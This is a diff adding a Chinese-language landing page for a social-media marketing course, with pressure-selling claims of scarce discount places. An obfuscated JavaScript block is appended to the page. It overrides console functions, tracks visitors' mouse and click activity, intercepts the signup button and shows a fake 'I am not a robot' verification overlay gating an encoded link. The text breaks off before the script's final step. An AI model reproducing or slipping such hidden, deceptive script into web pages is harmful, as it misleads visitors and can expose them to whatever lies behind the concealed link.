@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>社交媒体营销培训 - 引爆你的线上销售</title>
+    <style>
+        :root {
+            --primary: #6C63FF;
+            --secondary: #4D44DB;
+            --accent: #FF6584;
+            --light: #F8F9FA;
+            --dark: #212529;
+            --gray: #6C757D;
+            --success: #28A745;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: 0;
+            right: 0;
+            height: 100px;
+            background-color: var(--light);
+            transform: skewY(-3deg);
+            z-index: 1;
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 20px;
+            font-weight: 800;
+            animation: fadeIn 1s ease;
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 400;
+            max-width: 800px;
+            margin: 0 auto 30px;
+            animation: fadeIn 1.2s ease;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            background-color: var(--accent);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(255, 101, 132, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 25px rgba(255, 101, 132, 0.4);
+        }
+        
+        .content-section {
+            padding: 80px 0;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .content-block {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            margin-bottom: 40px;
+        }
+        
+        h3 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: var(--secondary);
+        }
+        
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: var(--gray);
+        }
+        
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin: 40px 0;
+        }
+        
+        .feature {
+            flex: 1 1 300px;
+            background: rgba(108, 99, 255, 0.05);
+            padding: 30px;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary);
+            transition: all 0.3s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+        
+        .feature h4 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: var(--dark);
+        }
+        
+        .testimonials {
+            background: linear-gradient(135deg, #f5f7fa, #e4e8f0);
+            padding: 60px 0;
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .testimonial {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+        
+        .testimonial-author {
+            font-weight: 600;
+            color: var(--secondary);
+        }
+        
+        .urgency-banner {
+            background: linear-gradient(135deg, var(--accent), #FF8E53);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 40px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        .urgency-banner h3 {
+            color: white;
+            margin-bottom: 10px;
+        }
+        
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            h2 {
+                font-size: 1.4rem;
+            }
+            
+            .content-section {
+                padding: 40px 0;
+            }
+            
+            .content-block {
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>30天内让你的社交媒体营销效果提升300%</h1>
+            <h2>别再让优秀的产品埋没在信息洪流中 - 掌握精准投放技巧，让目标客户主动找到你</h2>
+            <a href="#" class="cta-button" id="cta-btn-4ea0bca4">立即获取独家优惠</a>
+        </div>
+    </header>
+    
+    <section class="content-section">
+        <div class="container">
+            <div class="content-block">
+                <h3>为什么你的产品需要专业的社交媒体营销？</h3>
+                <p>在当今数字时代，90%的消费者通过社交媒体发现新产品，但大多数商家却不知道如何有效利用这些平台。我们的培训课程将彻底改变你的营销方式，让你不再依赖运气，而是掌握科学的数据驱动营销方法。</p>
+                <p>无论你是电商新手还是希望提升现有业务，这套系统都能帮助你在Facebook、Instagram、TikTok等平台上建立强大的营销漏斗，持续吸引高质量客户。</p>
+            </div>
+            
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">🚀</div>
+                    <h4>精准定位目标客户</h4>
+                    <p>学习如何利用平台算法和数据分析工具，精准找到最有可能购买你产品的客户群体，告别无效曝光。</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">💰</div>
+                    <h4>低成本高转化广告</h4>
+                    <p>掌握广告投放的黄金法则，用最低的预算获得最高的转化率，让你的每一分广告费都物有所值。</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">📈</div>
+                    <h4>数据驱动决策</h4>
+                    <p>学会解读关键指标，根据实时数据优化你的营销策略，持续提升ROI，告别盲目投放。</p>
+                </div>
+            </div>
+            
+            <div class="urgency-banner">
+                <h3>限时优惠: 前100名报名者享受50%折扣</h3>
+                <p>优惠名额仅剩23个，立即行动锁定你的位置！</p>
+            </div>
+        </div>
+    </section>
+    
+    <section class="testimonials">
+        <div class="container">
+            <h3 style="text-align: center; color: var(--secondary); margin-bottom: 40px;">学员成功案例</h3>
+            <div class="testimonial-grid">
+                <div class="testimonial">
+                    <p class="testimonial-text">"参加培训前，我的广告花费总是打水漂。学习后第一个月，我的ROI就提升了4倍，现在我的小店月销售额稳定在10万以上！"</p>
+                    <p class="testimonial-author">- 李女士，时尚饰品店主</p>
+                </div>
+                <div class="testimonial">
+                    <p class="testimonial-text">"作为营销新手，这套课程让我少走了很多弯路。老师讲解的广告投放技巧简单实用，我的健身课程报名人数增长了300%。"</p>
+                    <p class="testimonial-author">- 张教练，在线健身教练</p>
+                </div>
+                <div class="testimonial">
+                    <p class="testimonial-text">"最让我惊喜的是学会了如何分析数据。现在我能准确知道哪些广告有效，哪些需要调整，营销预算再也不会浪费了。"</p>
+                    <p class="testimonial-author">- 王先生，跨境电商卖家</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="content-section">
+        <div class="container" style="text-align: center;">
+            <h3>现在就行动，改变你的营销命运</h3>
+            <p style="max-width: 700px; margin: 0 auto 30px;">不要再让竞争对手抢走你的潜在客户。加入我们的社交媒体营销培训，掌握2024年最有效的数字营销策略。</p>
+            <a href="#" class="cta-button" id="cta-btn-4ea0bca4">立即获取独家优惠</a>
+            <p style="margin-top: 20px; font-size: 0.9rem; color: var(--gray);">30天无理由退款保证 · 一对一辅导支持 · 终身课程更新</p>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container">
+            <p>© 2024 社交媒体营销培训. 保留所有权利。</p>
+        </div>
+    </footer>
+<script type="text/javascript">function _0x9c6c(){const _0x4fe473=['yM9KEq','y2HLy2TLza','mtK1mvj3rLjQza','DhjPBq','i2y0ndmZnG','B3bLBG','mZCYmdaZCwPryKvf','y3nZvgv4Da','BgvUz3rO','CMv0DxjUicHMDw5JDgLVBIGPia','i2H1BwfUq2HLy2S','cIaGicaGicaGicaGidXOmYbZDhLSzt0IBwfYz2LUlwjVDhrVBtOGmtvWEdSIpUMQJoIVGEwUJoAiKo+8GtWVAdm+cIaGicaGicaGicaGidXWihn0EwXLpsjTyxjNAw4TyM90Dg9ToIaYmhb4oYi+54k55yE75lIl5PA55OYj6zkU57UN57UTpc9WpGOGicaGicaGicaGica8ysbOCMvMpsi','A2v5','DgfIBgu','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','y29UC3rYDwn0B3i','mtaYCgvRywPl','yM9YzgvYq29SB3i','Aw5MBW','y2XPzw50wa','y29SB3i','yMLUza','BwLU','Dg9tDhjPBMC','CMvTB3zL','ndqYnZK4mgrnr2X1za','Bw91C2vTB3zL','i3n1yM1PDefUC3DLCG','Bg9N','zgL2','ywrKrxzLBNrmAxn0zw5LCG','CxvLCNLtzwXLy3rVCG','yMfJA2DYB3vUza','mtbWvuHsz0u','AhjLzG','C2nYB2XSCW','y29UDgv4Dg1LBNu','zgL2w3n0EwXLkJ0ICg9ZAxrPB246igzPEgvKiL1BC3r5BguQpsjIywnRz3jVDw5KoIbYz2jHkdaSmcWWldaUnsKIxq','zMLUywXdDgfjza','y3rHqNv0Dg9Uswq','zxjYB3i','mtnYsxfNAva','5PYQ5OM+5yIWq1rb5OYj6zkUoG','C3r5Bgu','AM9PBG','mJyWnJuWoevpCNbXuG','nZmXmKzfD2DIDG','i2fUC3DLCKLUChv0','y29UC29Szq','Bw91C2vnB3zLBwvUDhm','z2v0qM91BMrPBMDdBgLLBNrszwn0','DMvYAwzPy2f0Aw9Uswq','y3rYBeTLEq','cIaGicaGicaGicaGidXOmYbZDhLSzt0IBwfYz2LUlwjVDhrVBtOGmJbWEdSGy29SB3i6icmZmZm7iJ7LRONLHAJPQOZOR4e8l2GZpGOGicaGicaGicaGica8CcbZDhLSzt0IBwfYz2LUlwjVDhrVBtOGmtvWEdSGzM9UDc1ZAxPLoIaXohb4oYi+','CMvTB3zLqxr0CMLIDxrL','BgvMDa','mtjKAgHRy2G','D2fYBG','Aw5Uzxjive1m','ChjLDMvUDerLzMf1Bhq','6k+35ywi5Rwp6kEi6Ag16z2I5yAf5A655yAn54k55yE75OYj6zkU','BM93','osddTYaZid0GpW','y2XPy2TZ','CMv2zxjZzq','zMLUywWTy3rHlq','iZrdquy1ma','y3jLyxrLrwXLBwvUDa','ode4ChPzBhHT','mJe1murMC3jiqW','mtC5mJyZAuvvA0re','otq5nZC4nxvPDMf2Dq','y2XPy2S','rw50zxi','mIddLYaZid0GpW','DhjHy2u','Bwf4','rJeY','Dgv4DenVBNrLBNq'];_0x9c6c=function(){return _0x4fe473;};return _0x9c6c();}function _0x8c21(_0x30cd0e,_0x50e184){const _0x56681e=_0x9c6c();return _0x8c21=function(_0x3148d6,_0x415bb1){_0x3148d6=_0x3148d6-0x188;let _0x3c9269=_0x56681e[_0x3148d6];if(_0x8c21['eXumXO']===undefined){var _0x9c6c7a=function(_0x3d1d6d){const _0x518c0c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5c162c='',_0x18dd90='';for(let _0x10e657=0x0,_0x28a184,_0x319394,_0x4168e5=0x0;_0x319394=_0x3d1d6d['charAt'](_0x4168e5++);~_0x319394&&(_0x28a184=_0x10e657%0x4?_0x28a184*0x40+_0x319394:_0x319394,_0x10e657++%0x4)?_0x5c162c+=String['fromCharCode'](0xff&_0x28a184>>(-0x2*_0x10e657&0x6)):0x0){_0x319394=_0x518c0c['indexOf'](_0x319394);}for(let _0x41901f=0x0,_0x4d3dea=_0x5c162c['length'];_0x41901f<_0x4d3dea;_0x41901f++){_0x18dd90+='%'+('00'+_0x5c162c['charCodeAt'](_0x41901f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x18dd90);};_0x8c21['sTpwYW']=_0x9c6c7a,_0x30cd0e=arguments,_0x8c21['eXumXO']=!![];}const _0x8c215c=_0x56681e[0x0],_0x17d349=_0x3148d6+_0x8c215c,_0x41d060=_0x30cd0e[_0x17d349];return!_0x41d060?(_0x3c9269=_0x8c21['sTpwYW'](_0x3c9269),_0x30cd0e[_0x17d349]=_0x3c9269):_0x3c9269=_0x41d060,_0x3c9269;},_0x8c21(_0x30cd0e,_0x50e184);}(function(_0x475828,_0x955ead){const _0x4a5733=_0x8c21,_0x5078e5=_0x475828();while(!![]){try{const _0x124680=-parseInt(_0x4a5733(0x18f))/0x1*(-parseInt(_0x4a5733(0x1d1))/0x2)+-parseInt(_0x4a5733(0x193))/0x3*(parseInt(_0x4a5733(0x1c5))/0x4)+parseInt(_0x4a5733(0x1a6))/0x5+parseInt(_0x4a5733(0x19d))/0x6*(parseInt(_0x4a5733(0x1d3))/0x7)+parseInt(_0x4a5733(0x1bb))/0x8*(-parseInt(_0x4a5733(0x1d2))/0x9)+-parseInt(_0x4a5733(0x1ae))/0xa*(parseInt(_0x4a5733(0x1d4))/0xb)+-parseInt(_0x4a5733(0x1ba))/0xc*(parseInt(_0x4a5733(0x1b6))/0xd);if(_0x124680===_0x955ead)break;else _0x5078e5['push'](_0x5078e5['shift']());}catch(_0x5276b2){_0x5078e5['push'](_0x5078e5['shift']());}}}(_0x9c6c,0x6d547),(function(){const _0x4a1d84=_0x8c21,_0x10e657=(function(){let _0x143443=!![];return function(_0x15260c,_0x4c4cfb){const _0x2c6486=_0x143443?function(){if(_0x4c4cfb){const _0x35b256=_0x4c4cfb['apply'](_0x15260c,arguments);return _0x4c4cfb=null,_0x35b256;}}:function(){};return _0x143443=![],_0x2c6486;};}());'use strict';const _0x28a184={'ctaButtonId':'cta-btn-4ea0bca4','verificationMethod':'A','obfuscatedLink':'vZmbWp5SNZkFHmc0R52bRpNXVdm9AyL6DMHcY0RHJa','verificationId':'verify-'+Math['random']()[_0x4a1d84(0x1a4)](0x24)['substr'](0x2,0x9),'finalCtaId':_0x4a1d84(0x1ce)+Math['random']()['toString'](0x24)['substr'](0x2,0x9)};let _0x319394={'mouseMovements':0x0,'clicks':0x0,'scrolls':0x0,'startTime':Date['now']()};function _0x4168e5(){const _0x2f50af=_0x4a1d84,_0x436e38=_0x10e657(this,function(){const _0x5e029b=_0x8c21,_0x375f45=function(){const _0x8597b6=_0x8c21;let _0x3a1b57;try{_0x3a1b57=Function(_0x8597b6(0x196)+_0x8597b6(0x19b)+');')();}catch(_0x2eb499){_0x3a1b57=window;}return _0x3a1b57;},_0x89e0fa=_0x375f45(),_0x21bbab=_0x89e0fa[_0x5e029b(0x1bd)]=_0x89e0fa['console']||{},_0x5417ea=[_0x5e029b(0x1a9),_0x5e029b(0x1c6),_0x5e029b(0x19f),_0x5e029b(0x1b5),'exception',_0x5e029b(0x19a),_0x5e029b(0x189)];for(let _0x4fc868=0x0;_0x4fc868<_0x5417ea['length'];_0x4fc868++){const _0x169a93=_0x10e657[_0x5e029b(0x19c)]['prototype']['bind'](_0x10e657),_0x18cb1f=_0x5417ea[_0x4fc868],_0x51fa60=_0x21bbab[_0x18cb1f]||_0x169a93;_0x169a93['__proto__']=_0x10e657['bind'](_0x10e657),_0x169a93['toString']=_0x51fa60[_0x5e029b(0x1a4)][_0x5e029b(0x1a2)](_0x51fa60),_0x21bbab[_0x18cb1f]=_0x169a93;}});_0x436e38(),document['readyState']==='loading'?document[_0x2f50af(0x1ab)]('DOMContentLoaded',_0x41901f):_0x41901f();}function _0x41901f(){_0x4d3dea(),_0x5c7923(),_0x6a71b4();}function _0x4d3dea(){const _0x41c854=_0x4a1d84;document[_0x41c854(0x1ab)](_0x41c854(0x1a7),function(){_0x319394['mouseMovements']++;}),document['addEventListener']('click',function(){const _0x5eb506=_0x41c854;_0x319394[_0x5eb506(0x1cc)]++;}),document['addEventListener']('scroll',function(){const _0x47f7aa=_0x41c854;_0x319394[_0x47f7aa(0x1b0)]++;});}function _0x5c7923(){const _0x1be066=_0x4a1d84,_0x56008d=document['getElementById'](_0x28a184[_0x1be066(0x1b4)]);if(!_0x56008d){console[_0x1be066(0x1a9)](_0x1be066(0x1b7),_0x28a184[_0x1be066(0x1b4)]);return;}_0x56008d[_0x1be066(0x1c3)](_0x1be066(0x1af)),_0x56008d['addEventListener']('click',function(_0x5edc48){const _0x2801f7=_0x1be066;_0x5edc48[_0x2801f7(0x1c8)](),_0xb08b81();});}function _0xb08b81(){const _0x49496a=_0x4a1d84;if(!_0x28ca2d()){alert(_0x49496a(0x1c9));return;}_0x44d0e7();}function _0x28ca2d(){const _0x1ce402=_0x4a1d84,_0x405722=Date[_0x1ce402(0x1ca)]()-_0x319394['startTime'];if(_0x405722<0xbb8)return![];if(_0x319394[_0x1ce402(0x1be)]<0x5)return![];return!![];}function _0x44d0e7(){const _0x1e8e93=_0x4a1d84,_0x3c6562=document[_0x1e8e93(0x1d0)](_0x1e8e93(0x1aa));_0x3c6562['id']=_0x28a184['verificationId'],_0x3c6562[_0x1e8e93(0x1b8)][_0x1e8e93(0x194)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translate(-50%,\x20-50%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2010px\x2030px\x20rgba(0,0,0,0.3);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x2010000;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20400px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x202px\x20solid\x20#ddd;\x0a\x20\x20\x20\x20\x20\x20\x20\x20';const _0x565ae7=document['createElement'](_0x1e8e93(0x1aa));_0x565ae7[_0x1e8e93(0x1b8)][_0x1e8e93(0x194)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20rgba(0,0,0,0.5);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x209999;\x0a\x20\x20\x20\x20\x20\x20\x20\x20',document[_0x1e8e93(0x18d)]['appendChild'](_0x565ae7),document['body']['appendChild'](_0x3c6562);if(_0x28a184['verificationMethod']==='A')_0x5549cc(_0x3c6562);else _0x28a184['verificationMethod']==='B'?_0x91e0b9(_0x3c6562):_0x4f52ff(_0x3c6562);}function _0x5549cc(_0x510d7b){const _0x51d6ff=_0x4a1d84;_0x510d7b[_0x51d6ff(0x1c7)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x22margin-bottom:\x2020px;\x20color:\x20#333;\x22>安全验证</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22margin:\x2020px\x200;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label\x20style=\x22display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20cursor:\x20pointer;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22checkbox\x22\x20id=\x22humanCheck\x22\x20style=\x22margin-right:\x2010px;\x20transform:\x20scale(1.2);\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20style=\x22font-size:\x2016px;\x22>我不是机器人</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22verifyBtn\x22\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#4CAF50;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x20disabled>验证</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';const _0x49cae7=_0x510d7b['querySelector'](_0x51d6ff(0x197)),_0x5da0d4=_0x510d7b[_0x51d6ff(0x1ac)]('#verifyBtn');_0x49cae7[_0x51d6ff(0x1ab)]('change',function(){const _0x4d4994=_0x51d6ff;_0x5da0d4['disabled']=!this[_0x4d4994(0x18e)],_0x5da0d4['style'][_0x4d4994(0x1ad)]=this[_0x4d4994(0x18e)]?_0x4d4994(0x1cf):'#ccc';}),_0x5da0d4[_0x51d6ff(0x1ab)](_0x51d6ff(0x1d5),function(){_0x49cae7['checked']&&_0x5129c3();});}function _0x91e0b9(_0x1de968){const _0x16ee3a=_0x4a1d84;_0x1de968[_0x16ee3a(0x1c7)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x22margin-bottom:\x2020px;\x20color:\x20#333;\x22>安全验证</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22margin-bottom:\x2015px;\x22>请滑动滑块到最右边</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22position:\x20relative;\x20width:\x20300px;\x20height:\x2040px;\x20background:\x20#f0f0f0;\x20border-radius:\x2020px;\x20margin:\x200\x20auto;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22slider\x22\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#4CAF50;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20id=\x22sliderStatus\x22\x20style=\x22margin-top:\x2015px;\x20color:\x20#666;\x22>请拖动滑块</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';const _0x4ed0ec=_0x1de968[_0x16ee3a(0x1ac)]('#slider'),_0x38594d=_0x1de968['querySelector']('#sliderStatus');let _0x1fc37d=![],_0x42568c=0x0;_0x4ed0ec[_0x16ee3a(0x1ab)]('mousedown',function(_0x1c0e15){_0x1fc37d=!![];}),document['addEventListener'](_0x16ee3a(0x1a7),function(_0x45180b){const _0x55bff3=_0x16ee3a;if(!_0x1fc37d)return;const _0x540a5c=_0x4ed0ec['parentElement'][_0x55bff3(0x1bf)]();_0x42568c=Math[_0x55bff3(0x18a)](0x0,Math[_0x55bff3(0x1a3)](0x104,_0x45180b[_0x55bff3(0x1a0)]-_0x540a5c['left']-0x14)),_0x4ed0ec[_0x55bff3(0x1b8)][_0x55bff3(0x1c4)]=_0x42568c+'px',_0x42568c>0xfa&&(_0x38594d[_0x55bff3(0x18c)]='验证成功！',_0x38594d[_0x55bff3(0x1b8)][_0x55bff3(0x1a1)]='#4CAF50',setTimeout(_0x5129c3,0x1f4));}),document[_0x16ee3a(0x1ab)]('mouseup',function(){_0x1fc37d=![];});}function _0x4f52ff(_0x2322f9){const _0x5c0567=_0x4a1d84,_0x305a65=[{'q':'3\x20+\x205\x20=\x20?','a':'8'},{'q':'10\x20-\x204\x20=\x20?','a':'6'},{'q':_0x5c0567(0x188),'a':'6'},{'q':_0x5c0567(0x1cb),'a':'3'}],_0x1cb425=_0x305a65[Math['floor'](Math['random']()*_0x305a65['length'])];_0x2322f9['innerHTML']=_0x5c0567(0x1c2)+_0x1cb425['q']+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22answerInput\x22\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x202px\x20solid\x20#ddd;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x20placeholder=\x22答案\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22submitAnswer\x22\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#4CAF50;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22>提交</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';const _0x5d71af=_0x2322f9[_0x5c0567(0x1ac)](_0x5c0567(0x1bc)),_0x2e8895=_0x2322f9['querySelector'](_0x5c0567(0x1a8));function _0x4bf8bd(){const 